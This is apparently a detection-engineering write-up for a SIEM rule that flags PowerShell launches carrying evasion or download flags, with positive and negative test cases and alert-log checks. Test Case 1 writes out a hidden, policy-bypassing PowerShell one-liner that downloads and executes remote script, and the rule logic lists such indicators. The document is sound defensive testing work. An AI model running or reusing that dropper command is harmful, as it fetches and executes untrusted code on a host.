# Detection 003 — Suspicious PowerShell

**Rule:** 100300
**MITRE:** T1059.001 (Command and Scripting Interpreter: PowerShell)
**Platform:** Windows (window10)

## Logic

Fires when `powershell.exe`/`powershell_ise.exe` is launched **and** the command line contains at least one known evasion/download indicator: `-nop`, `-noprofile`, `-w hidden`/`-windowstyle hidden`, `-ep bypass`/`-executionpolicy bypass`, `downloadstring`, `downloadfile`, `invoke-expression`/`iex`, `-sta`, `iwr`.

Deliberately does **not** fire on plain PowerShell usage — the rule requires a suspicious indicator, not just the presence of `powershell.exe`.

## Test Case 1: Multiple indicators at once (dropper simulation)

```powershell
powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://example.com')"
```

**Expected:** rule **100300** fires (matches `-nop`, `-w hidden`, `-ep bypass`, `downloadstring`, `iex` — any one would be enough).

## Test Case 2: Single indicator

```powershell
powershell.exe -windowstyle hidden -command "Write-Host test"
```

**Expected:** rule **100300** fires.

## Negative Test: Plain PowerShell usage should NOT fire

```powershell
powershell.exe -command "Get-Process"
```

**Expected:** no alert — proves the rule isn't just flagging all PowerShell execution, which would create unmanageable noise.

## Verification

```bash
sudo grep -a "100300" /var/ossec/logs/alerts/alerts.json | tail -n 5
```

Live:
```bash
sudo tail -f /var/ossec/logs/alerts/alerts.json | grep -a --line-buffered "100300"
```

## Dashboard check

```
rule.id: 100300
```

## Notes for writeup

The negative test is the key evidence here — it demonstrates the detection discriminates risky PowerShell usage from routine usage, directly addressing the requirement to avoid "alert on every PowerShell execution" noise.
